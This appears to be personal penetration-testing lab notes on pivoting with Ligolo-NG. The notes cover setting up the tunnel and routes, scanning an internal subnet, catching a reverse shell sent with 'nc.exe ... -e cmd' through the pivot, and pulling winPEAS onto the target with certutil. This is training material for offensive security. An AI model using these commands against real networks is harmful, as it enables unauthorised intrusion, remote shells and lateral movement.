# Using Ligolo-NG to pivot

## Downloading Ligolo-NG
1. Download a Ligolo agent file (Linux, Windows x86 and Windows x64)
	- `https://github.com/nicocha30/ligolo-ng/releases`
	
## Configuring the proxy (Attack Machine)
1. Add an interface to your kali machine and set that interface `up`
	- `sudo ip tuntap add user franglais mode tun ligolo`
	- `sudo ip link set ligolo up`
2. `cd` where you have your proxy executable and run it using `-selfcert`
	- `./proxy -selfcert`
3. Proxy server is now running - note that it's listening on `0.0.0.0:11601`

## Configure the Agent (Target Machine, MS-01)
1. Get the `agent` file onto the target machine
2. ***AFTER*** step 3 of the proxy config (proxy server running), run the agent
	- `.\agent.exe -connect <AttackIP:11601> -ignore-cert`
	- After a short delay, the agent is picked up by ligolo proxy srv
	
## Setting up the pivot
1. In ligolo srv, type `session` to use the correct session, then use it
2. `ifconfig` to show agent interface(s)
3. In the attack machine, open a new terminal and add a route to the routing table
	- `sudo ip route add 10.10.103.0/24 dev ligolo`
	- `ip route list` to confirm that it's there
4. In the ligolo srv, verify `session` and then run `start` to open the tunnel
	- `crackmapexec smb 10.10.103.0/24` to verify reaching internal network
	
## Using ligolo to receive reverse shells
1. Use `listener_list` to list listeners on your ligolo srv
2. Set up your listener on the attack machine. This will not work at first
	- `rlwrap nc -lvnp 4444`
3. Add a listener to the ligolo agent in ligolo srv and confirm it's active
	- `listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444`
	- `listener_list`
4. In the target machine, send your rev shell using the internal ip of MS-01 ***NOT*** the attack machine
	- `nc.exe 10.10.103.141 1234 -e cmd` (or your RCE exploit)

## Using ligolo to xfer files
1. Set up a new listener in ligolo srv for file xfers and confirm it's active
	- `listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80` your "to" port should match the port you're goign to be serving on!!!
	- `listener_list` *you should have two listeners*
2. Set up your websrv in your attack machine
	- `python3 -m http.server`
3. *In your rev shell*, set your file xfer using the address of MS-01 pivot
	- `certutil.exe -URLCache -f http://10.10.103.142:1235 winPEASx64.exe winPEASx64.exe`
